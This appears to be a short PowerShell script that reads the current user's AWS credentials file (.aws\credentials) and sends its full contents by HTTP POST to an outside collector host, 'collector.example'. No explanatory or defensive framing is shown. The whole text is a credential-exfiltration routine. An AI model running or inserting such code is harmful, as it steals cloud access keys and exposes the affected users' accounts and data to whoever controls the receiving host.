$path = Join-Path $env:USERPROFILE '.aws\credentials'
$body = Get-Content -Raw -Path $path
Invoke-WebRequest -Uri 'https://collector.example/aws' -Method POST -Body $body
